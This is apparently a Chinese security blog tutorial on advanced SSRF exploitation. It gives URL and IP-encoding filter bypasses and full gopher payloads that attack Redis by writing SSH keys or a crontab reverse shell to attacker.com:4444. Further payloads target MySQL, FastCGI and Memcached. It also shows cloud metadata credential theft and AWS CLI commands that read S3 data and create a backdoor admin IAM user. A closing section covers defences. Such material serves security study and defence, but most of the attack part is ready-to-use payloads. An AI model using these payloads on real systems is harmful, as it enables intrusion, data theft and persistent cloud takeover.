---
title: SSRF讲解—高级利用技术与云环境逃逸
date: 2026-09-12 21:00:00
categories: [Web安全]
tags: [Web安全, CTF]
cover: https://cdn.jsdelivr.net/gh/TSVMV/TSVMV.github.io@main/source/img/bg15.jpg
---

## SSRF 的进阶视角

基础 SSRF（探测内网端口、访问云元数据、file 协议读文件）是入门内容。高级 SSRF 关注的是：在严格的 URL 过滤、DNS 重绑定保护、云环境隔离下，如何构造可靠的利用链；以及 gopher 协议攻击内网服务、Redis 未授权利用、FastCGI 攻击、云服务元数据高级利用等技术。

本文假设读者已经掌握基础 SSRF 原理，重点讲解高级利用技术。

<!-- more -->

## URL 解析差异与绕过

SSRF 防御的核心是 URL 过滤，但不同的 URL 解析库对同一个 URL 的解析结果可能不同。利用这种差异是高级 SSRF 绕过的关键。

### 1. @ 符号歧义

```
http://allowed.com@127.0.0.1/
```

有些解析器认为 host 是 `allowed.com`（用于过滤检查），实际请求的是 `127.0.0.1`（`@` 后面的才是真正的 host）。

### 2. # 符号（fragment）

```
http://127.0.0.1#allowed.com
```

fragment 部分不会发送给服务器，有些过滤函数会错误地把整个字符串当作 host。

### 3. 端口跳跃

```
http://127.0.0.1:80@allowed.com/
```

有些解析器会把 `127.0.0.1:80` 当作 userinfo，实际请求 `allowed.com`；而另一些解析器会请求 `127.0.0.1:80`。

### 4. 多余的斜杠和反斜杠

```
http:///127.0.0.1/
http:\\127.0.0.1\
http:127.0.0.1
```

不同的解析器对这些非标准格式的处理不同。

### 5. 点号和零宽字符

```
http://127。0。0。1/   # 中文句号
http://127.0.0.1%00/   # 空字节截断
http://①②⑦.⓪.⓪.①/  # 带圈数字（某些解析器会归一化）
```

### 6. DNS 解析差异

当过滤逻辑会先解析 DNS 验证 IP，然后再发起请求时，可以用 DNS 重绑定（DNS Rebinding）：第一次解析返回白名单 IP，第二次解析返回内网 IP。

需要一个可控的 DNS 服务器，设置很短的 TTL（如 0 秒）。

## IP 地址变形的完整列表

当 `127.0.0.1` 被过滤时，用各种表示法绕过：

### 十进制

```
http://2130706433/    # 127.0.0.1 = 127*2^24 + 0*2^16 + 0*2^8 + 1
```

### 十六进制

```
http://0x7f000001/
http://0x7f.0x0.0x0.0x1/
```

### 八进制

```
http://0177.0.0.1/
http://017700000001/
```

### 混合进制

```
http://0x7f.0.0.1/
http://127.0.0x1/
http://0177.0.0.1/
```

### 短地址（省略零）

```
http://127.1/        # 127.0.0.1
http://127.0.1/      # 127.0.0.1
http://10.1/         # 10.0.0.1
```

### IPv6

```
http://[::1]/                    # 回环地址
http://[0:0:0:0:0:0:0:1]/
http://[::ffff:127.0.0.1]/      # IPv4 映射的 IPv6 地址
```

### 域名解析

```
http://localhost/
http://localtest.me/             # 解析到 127.0.0.1
http://127.0.0.1.nip.io/        # 任意子域名解析到 127.0.0.1
http://spoofed.burpcollaborator.net/  # 可控域名
```

## gopher 协议深度利用

gopher 是 SSRF 的"瑞士军刀"，可以构造任意 TCP 数据包，攻击各种内网服务。

### gopher 格式

```
gopher://host:port/_<TCP数据>
```

`_` 后面的内容就是发送到目标端口的原始 TCP 数据，需要 URL 编码。

### 攻击 Redis（未授权）

最经典的 gopher 利用是攻击未授权的 Redis（6379 端口）。

#### 写 SSH 公钥

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0assh-rsa%20AAAAB3NzaC1yc2EAAAADAQABAAABAQC...%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$19%0d%0a/root/.ssh/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$11%0d%0adbfilename%0d%0a$15%0d%0aauthorized_keys%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

#### 写 crontab 反弹 shell

```
gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1%20*%20*%20*%20*%20bash%20-i%20>&%20/dev/tcp/attacker.com/4444%200>&1%0a%0a%0a%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0a
```

#### Redis 主从复制 RCE

当 Redis 以 root 运行且可以加载模块时，通过主从复制加载恶意 .so 模块实现 RCE：

1. 攻击者服务器上运行一个恶意的 Redis 从节点，提供恶意模块
2. 通过 gopher 配置目标 Redis 的主从复制指向攻击者
3. 目标 Redis 同步时加载恶意模块，执行任意命令

### 攻击 MySQL

gopher 可以构造 MySQL 协议数据包，攻击未授权或弱口令的 MySQL：

```
# 未授权 MySQL 的基本探测
gopher://127.0.0.1:3306/_%a5%00%00%01%85%a6%3f%20%00%00%00%01%21%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%72%6f%6f%74%00%00%6d%79%73%71%6c%5f%6e%61%74%69%76%65%5f%70%61%73%73%77%6f%72%64%00
```

### 攻击 FastCGI（PHP-FPM）

PHP-FPM 默认监听 9000 端口，gopher 可以构造 FastCGI 协议数据包，执行任意 PHP 代码：

```
gopher://127.0.0.1:9000/_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%00%...
```

需要构造完整的 FastCGI 协议包，包括：
- FCGI_BEGIN_REQUEST
- FCGI_PARAMS（设置 SCRIPT_FILENAME、PHP_VALUE 等）
- FCGI_STDIN（POST 数据）

通过设置 `PHP_VALUE` 为 `auto_prepend_file = php://input`，然后在 STDIN 中传入 PHP 代码，实现任意代码执行。

### 攻击 Memcached

```
# 读取所有 key
gopher://127.0.0.1:11211/_stats%20items%0d%0a
# 读取指定 key
gopher://127.0.0.1:11211/_get%20session_key%0d%0a
```

## 云环境 SSRF 高级利用

### AWS 元数据服务

AWS 的元数据服务地址是 `169.254.169.254`，可以获取实例的临时凭证。

#### IMDSv1（无令牌）

```
# 获取实例信息
http://169.254.169.254/latest/meta-data/

# 获取 IAM 角色
http://169.254.169.254/latest/meta-data/iam/security-credentials/

# 获取临时凭证（AccessKeyId, SecretAccessKey, Token）
http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>

# 获取用户数据（可能包含敏感信息）
http://169.254.169.254/latest/user-data
```

#### IMDSv2（需要会话令牌）

IMDSv2 需要先 PUT 请求获取令牌，然后用令牌访问元数据。SSRF 如果只能发 GET 请求，需要用其他方法：

```
# 某些 SSRF 可以控制请求方法（如 curl 包装的 SSRF）
PUT /latest/api/token HTTP/1.1
X-aws-ec2-metadata-token-ttl-seconds: 21600

# 然后用令牌访问
GET /latest/meta-data/ HTTP/1.1
X-aws-ec2-metadata-token: <token>
```

如果 SSRF 只能发 GET，可以尝试：
- 利用 `gopher` 协议构造 PUT 请求
- 利用某些服务的请求走私
- 利用 DNS rebinding + 特定的请求方法

#### 利用临时凭证

获取到临时凭证后，可以用 AWS CLI 操作云资源：

```bash
export AWS_ACCESS_KEY_ID=...
export AWS_SECRET_ACCESS_KEY=...
export AWS_SESSION_TOKEN=...

# 列出 S3 存储桶
aws s3 ls

# 读取 S3 中的敏感文件
aws s3 cp s3://bucket/secret.txt -

# 列出 EC2 实例
aws ec2 describe-instances

# 创建 IAM 用户（持久化）
aws iam create-user --user-name backdoor
aws iam attach-user-policy --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
```

### 阿里云 / 腾讯云 / 华为云

| 云厂商 | 元数据地址 |
|--------|-----------|
| 阿里云 | `100.100.100.200` |
| 腾讯云 | `metadata.tencentyun.com` 或 `169.254.0.23` |
| 华为云 | `169.254.169.254` |
| Azure | `169.254.169.254/metadata/instance?api-version=2021-02-01`（需要 `Metadata: true` 头） |
| GCP | `metadata.google.internal`（需要 `Metadata-Flavor: Google` 头） |

### 云服务内网攻击

SSRF 可以攻击云环境中的内网服务：

- **RDS 数据库**：云数据库的内网地址，通常未授权或弱口令
- **Redis / Memcached**：缓存服务的内网地址
- **容器服务 API**：Kubernetes API Server（6443 端口）、Docker API（2375 端口）
- **服务注册中心**：Nacos（8848）、Eureka（8761）、Consul（8500）、Apollo
- **消息队列**：RabbitMQ（15672）、Kafka（9092）
- **Elasticsearch**：9200 端口，未授权可读写数据

### Kubernetes 环境 SSRF

在 K8s 环境中，SSRF 可以攻击：

- **K8s API Server**：`kubernetes.default.svc:443`，用 ServiceAccount token 认证
- **读取 ServiceAccount token**：`file:///var/run/secrets/kubernetes.io/serviceaccount/token`
- **Kubelet API**：节点上的 10250 端口，未授权可执行命令
- **etcd**：2379 端口，存储集群所有数据
- **内部服务**：通过 CoreDNS 解析 `*.default.svc.cluster.local`

## 无回显 SSRF 技术

当 SSRF 的响应不返回给用户时，需要用带外（OOB）技术判断内网服务状态。

### 1. DNS 外带

```
# 让目标服务器请求一个可控域名，根据 DNS 查询判断服务是否存在
http://192.168.1.1.xxx.dnslog.cn/
# 如果 192.168.1.1 上有 HTTP 服务，它可能会请求这个域名（取决于应用逻辑）
```

更可靠的方式是利用 HTTP 重定向：
1. 控制一个服务器，返回 302 重定向到 `http://xxx.dnslog.cn`
2. 让 SSRF 请求你的服务器
3. 如果目标服务器跟随重定向，DNSLog 会收到查询

### 2. 时间差判断

```
# 开放端口：连接成功，应用快速返回或处理响应
# 关闭端口：连接被拒绝（RST），应用快速返回错误
# 过滤端口：连接超时，应用等待很久才返回

# 根据响应时间判断端口状态
http://192.168.1.1:22/    # SSH，开放时响应时间特征
http://192.168.1.1:80/    # HTTP
http://192.168.1.1:3306/  # MySQL
```

### 3. 利用服务的副作用

某些服务被请求后会产生可观测的副作用：
- **Redis**：写入一个 key，然后通过其他途径读取
- **SMTP**：发送邮件到可控邮箱
- **DNS**：请求可控域名
- **Webhook**：触发外部 webhook

## SSRF 利用链构建

### 完整的内网渗透链

```
SSRF 点
  │
  ├─ 1. 信息收集
  │   ├─ file:///proc/net/arp → 内网 IP 列表
  │   ├─ file:///etc/hosts → 主机名映射
  │   ├─ file:///proc/self/cmdline → 启动命令
  │   └─ file:///proc/net/tcp → 开放端口（hex 编码）
  │
  ├─ 2. 端口扫描
  │   └─ 逐个探测内网 IP 的常见端口
  │
  ├─ 3. 攻击高价值服务
  │   ├─ Redis（6379）→ 写 SSH 公钥 / crontab
  │   ├─ MySQL（3306）→ 读数据 / 写文件
  │   ├─ Docker API（2375）→ 创建特权容器
  │   ├─ K8s API（6443）→ 用 ServiceAccount 操作集群
  │   └─ Elasticsearch（9200）→ 读写数据
  │
  ├─ 4. 云元数据
  │   └─ 获取临时凭证 → 操作云资源
  │
  └─ 5. 持久化
      ├─ 云环境：创建 IAM 用户 / AccessKey
      ├─ 容器：部署后门容器
      └─ 主机：写入 SSH 公钥 / crontab
```

## 防御的深度

### 1. 白名单（最有效）

只允许请求特定的域名或 IP 段，而不是黑名单。

### 2. DNS 重绑定保护

- 先解析 DNS，验证 IP，然后用解析后的 IP 直接请求（不要重新解析）
- 设置 `--resolve` 固定 DNS 解析结果
- 对 DNS 响应设置最小 TTL

### 3. 禁用危险协议

只允许 `http://` 和 `https://`，禁用 `file://`、`gopher://`、`dict://`、`ftp://` 等。

### 4. 不跟随重定向

或者重定向后再次验证目标 URL。

### 5. 网络层隔离

- 把发起外部请求的服务放在单独的网络区域
- 安全组禁止访问内网和云元数据地址（169.254.0.0/16、100.100.100.200）
- 云环境用 VPC 隔离

### 6. 云安全加固

- 启用 IMDSv2（需要会话令牌）
- 给实例分配最小权限的 IAM 角色
- 安全组限制内网服务的访问来源

## 总结

高级 SSRF 的核心是**理解协议和网络的内部机制**——URL 解析器的差异、IP 地址的各种表示法、gopher 协议构造任意 TCP 包、云元数据服务的认证机制、内网服务的未授权利用。从基础的端口探测到完整的内网渗透链，从 gopher 攻击 Redis 到云环境临时凭证窃取，SSRF 的利用面非常广。

SSRF 防御的关键是**白名单 + DNS 重绑定保护 + 协议限制 + 网络隔离**，多层防御。黑名单（过滤 127.0.0.1、localhost）永远可以被绕过——IP 地址的表示法太多了，URL 解析差异太多了。

在云原生时代，SSRF 的危害越来越大——云元数据服务、内网微服务、容器 API、K8s API 都可能被 SSRF 触达。理解高级 SSRF 技术，是每个 Web 安全研究者的必修课。
